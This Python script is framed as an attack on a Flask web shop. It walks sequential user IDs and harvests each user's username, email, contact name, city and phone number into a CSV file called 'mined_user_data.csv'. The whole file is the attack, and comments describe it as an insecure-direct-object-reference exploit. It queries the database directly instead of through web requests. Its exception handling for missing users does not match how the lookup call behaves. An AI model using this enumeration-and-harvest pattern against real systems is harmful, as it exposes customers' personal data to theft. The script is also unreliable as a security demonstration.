import csv
from flaskshop.app import create_app
from flaskshop.account.models import User, UserAddress # Assumed location of models
from flaskshop.extensions import db
from sqlalchemy.exc import NoResultFound

# 1. Initialize the Flask application context
# This is required to access the database and models
app = create_app()
app.app_context().push()

# 2. Define the output file and fields
OUTPUT_FILE = 'mined_user_data.csv'
FIELDNAMES = ['User ID', 'Username', 'Email', 'Address Contact Name', 'Address City', 'Address Phone']

# 3. Determine a range for user IDs to scrape (e.g., first 50 users)
# In a real attack, the range would be determined by trial and error.
MAX_USER_ID = 50

print(f"Starting data mining for User IDs 1 to {MAX_USER_ID}...")

with open(OUTPUT_FILE, 'w', newline='', encoding='utf-8') as csvfile:
    writer = csv.DictWriter(csvfile, fieldnames=FIELDNAMES)
    writer.writeheader()

    # Iterate through potential sequential IDs
    for user_id in range(1, MAX_USER_ID + 1):
        try:
            # 4. **THE VULNERABLE STEP**: Directly retrieve data by ID.
            # In a real web request, this ID would be passed as a URL parameter.
            # We are simulating the successful backend database call.
            user = db.session.get(User, user_id) 

            if user:
                # Assuming one main address is enough for this example
                address = UserAddress.query.filter_by(user_id=user_id).first()
                
                # 5. Compile the mined data
                row_data = {
                    'User ID': user.id,
                    'Username': user.username,
                    'Email': user.email,
                    'Address Contact Name': address.contact_name if address else 'N/A',
                    'Address City': address.city if address else 'N/A',
                    'Address Phone': address.contact_phone if address else 'N/A',
                }
                
                writer.writerow(row_data)
                print(f"Successfully mined data for User ID: {user_id}")

        except NoResultFound:
            print(f"No user found for ID: {user_id}")
            continue
        except Exception as e:
            print(f"An error occurred for ID {user_id}: {e}")

print(f"\n--- Data mining complete! ---")
print(f"Data stored in {OUTPUT_FILE}")